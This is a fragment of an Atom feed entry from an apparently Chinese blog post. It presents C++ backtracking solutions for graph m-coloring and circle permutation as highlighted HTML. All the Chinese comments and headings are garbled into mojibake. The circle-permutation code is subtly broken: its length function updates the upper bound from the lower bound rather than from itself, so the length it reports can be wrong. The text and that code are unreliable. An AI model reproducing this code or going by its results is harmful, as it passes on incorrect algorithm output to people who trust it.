punctuation">&#125;</span></code></pre><h1 id="å›¾çš„mç€è‰²é—®é¢˜"><a href="#å›¾çš„mç€è‰²é—®é¢˜" class="headerlink" title="å›¾çš„mç€è‰²é—®é¢˜"></a>å›¾çš„mç€è‰²é—®é¢˜</h1><h2 id="é¢˜ç›®æè¿°-5"><a href="#é¢˜ç›®æè¿°-5" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/m.png"></p><h2 id="è§£é¢˜ä»£ç -5"><a href="#è§£é¢˜ä»£ç -5" class="headerlink" title="è§£é¢˜ä»£ç "></a>è§£é¢˜ä»£ç </h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// å›¾çš„é‚»æ¥çŸ©é˜µå½¢å¼</span><span class="token keyword">struct</span> <span class="token class-name">MGraph</span> <span class="token punctuation">&#123;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> vertices<span class="token punctuation">;</span> <span class="token comment">// é¡¶ç‚¹æ•°ç»„ï¼ˆå…ƒç´ ä¸ºå­—ç¬¦ç±»å‹ï¼‰</span><span class="token comment">// é‚»æ¥çŸ©é˜µï¼Œedges[u][v] == INT32_MAX ? æ— è¾¹ : å­˜åœ¨æƒå€¼ä¸ºedges[u][v]çš„è¾¹</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> edges<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">mColoring</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å›¾çš„é¡¶ç‚¹ä¸ªæ•°</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> res<span class="token punctuation">;</span> <span class="token comment">// æ‰€æœ‰ç€è‰²æ–¹æ¡ˆï¼Œè‹¥æ— åˆæ³•ç€è‰²æ–¹æ¡ˆï¼Œåˆ™ä¸ºç©º</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">coloring</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å½“å‰ç€è‰²æ–¹æ¡ˆ</span><span class="token comment">// æ£€æŸ¥æ‰€æœ‰ä¸é¡¶ç‚¹idxç›¸è¿çš„é¡¶ç‚¹jæ˜¯å¦ä¸é¡¶ç‚¹idxé¢œè‰²ç›¸åŒï¼Œè‹¥ç›¸åŒï¼Œåˆ™æ­¤ç€è‰²æ–¹æ¡ˆä¸åˆæ³•</span><span class="token keyword">auto</span> check <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX <span class="token operator">&amp;&amp;</span> coloring<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> coloring<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// é€’å½’æœç´¢å‡½æ•°</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// åˆ°è¾¾æœ€å¤§æœç´¢æ·±åº¦ï¼Œå°†è¯¥ç€è‰²æ–¹æ¡ˆåŠ å…¥è§£é›†ä¸­</span>res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>coloring<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// éå†æ‰€æœ‰é¢œè‰²ï¼Œå°è¯•ä¸ºé¡¶ç‚¹idxè¿›è¡Œç€è‰²</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>coloring<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span> <span class="token comment">// ç€è‰²</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// æ­¤ç€è‰²åˆæ³•ï¼Œç»§ç»­å‘ä¸‹æœç´¢</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>coloring<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// å›æº¯</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="åœ†æ’åˆ—é—®é¢˜"><a href="#åœ†æ’åˆ—é—®é¢˜" class="headerlink" title="åœ†æ’åˆ—é—®é¢˜"></a>åœ†æ’åˆ—é—®é¢˜</h1><h2 id="é¢˜ç›®æè¿°-6"><a href="#é¢˜ç›®æè¿°-6" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/circle.png"></p><h2 id="è§£é¢˜ä»£ç -6"><a href="#è§£é¢˜ä»£ç -6" class="headerlink" title="è§£é¢˜ä»£ç "></a>è§£é¢˜ä»£ç </h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">double</span> <span class="token function">circlePermutation</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span><span class="token operator">&amp;</span> radius<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> radius<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åœ†çš„ä¸ªæ•°</span><span class="token keyword">double</span> res <span class="token operator">=</span> INT32_MAX<span class="token punctuation">;</span> <span class="token comment">// æœ€å°é•¿åº¦</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> optimalPerm<span class="token punctuation">;</span> <span class="token comment">// æœ€å°é•¿åº¦å¯¹åº”çš„æ’åˆ—æ–¹å¼</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> <span class="token function">curX</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// curX[i]è¡¨ç¤ºå½“å‰æ’åˆ—ä¸‹åœ†içš„åœ†å¿ƒæ¨ªåæ ‡</span><span class="token comment">// è®¡ç®—å½“å‰æ’åˆ—ä¸‹åœ†idxçš„åœ†å¿ƒæ¨ªåæ ‡</span><span class="token keyword">auto</span> calCenter <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">double</span> <span class="token punctuation">&#123;</span><span class="token keyword">double</span> xMax <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> idx<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">double</span> x <span class="token operator">=</span> curX<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2.0</span> <span class="token operator">*</span> <span class="token function">sqrt</span><span class="token punctuation">(</span>radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">*</span> radius<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xMax <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>xMax<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> xMax<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// è®¡ç®—å½“å‰æ’åˆ—ä¸‹çš„æ€»é•¿åº¦</span><span class="token keyword">auto</span> calLen <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">double</span> <span class="token punctuation">&#123;</span><span class="token keyword">double</span> low <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>low <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> curX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> radius<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>high <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> curX<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> radius<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> high <span class="token operator">-</span> low<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// é€’å½’æœç´¢å‡½æ•°</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// åˆ°è¾¾æœ€å¤§æœç´¢æ·±åº¦</span><span class="token keyword">double</span> len <span class="token operator">=</span> <span class="token function">calLen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// æ›´æ–°æœ€ä¼˜è§£</span>res <span class="token operator">=</span> len<span class="token punctuation">;</span>optimalPerm <span class="token operator">=</span> radius<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> idx<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// å…¨æ’åˆ—</span><span class="token function">swap</span><span class="token punctuation">(</span>radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> radius<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">double</span> centerX <span class="token operator">=</span> <span class="token function">calCenter</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>centerX <span class="token operator">+</span> radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">+</span> radius<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// å‰ªæ</span>curX<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> centerX<span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">swap</span><span class="token punctuation">(</span>radius<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> radius<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ‰“å°æœ€ä¼˜è§£å¯¹åº”çš„åœ†æ’åˆ—</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> optimalPerm<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;è£…è½½é—®é¢˜&quot;&gt;&lt;a href=&quot;#è£…è½½é—®é¢˜&quot; class=&quot;headerlink&quot; title=&quot;è£…è½½é—®é¢˜&quot;&gt;&lt;/a&gt;è£…è½½é—®é¢˜&lt;/h1&gt;&lt;h2 id=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;a href=&quot;#é¢˜ç›®æè¿°&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="æ•°æ®ç»“æ„ä¸ç®—æ³•" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="C++" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="ç®—æ³•" scheme="http://lordaeronesz.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="æ•°æ®ç»“æ„" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
</feed>
